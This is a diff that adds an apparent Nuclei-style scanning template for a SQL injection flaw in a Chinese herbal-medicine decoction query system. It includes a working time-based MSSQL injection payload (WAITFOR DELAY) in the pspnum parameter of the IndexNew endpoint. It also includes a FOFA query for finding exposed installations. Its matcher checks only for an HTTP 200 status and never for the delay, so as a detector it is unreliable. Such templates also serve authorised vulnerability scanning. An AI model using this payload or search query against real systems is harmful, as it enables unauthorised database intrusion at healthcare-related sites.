@@ -1,0 +1,29 @@
+id: poc-vang7ecl9xc18p82
+info:
+  name: 中药煎药查询系统 IndexNew 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/vang7ecl9xc18p82'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: vang7ecl9xc18p82
+    fofa: title="中药煎药查询"
+http:
+- raw:
+  - 'GET /PreDetail/IndexNew?pspnum=1'';WAITFOR%20DELAY%20''0:0:5''-- HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Accept-Encoding: gzip, deflate'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
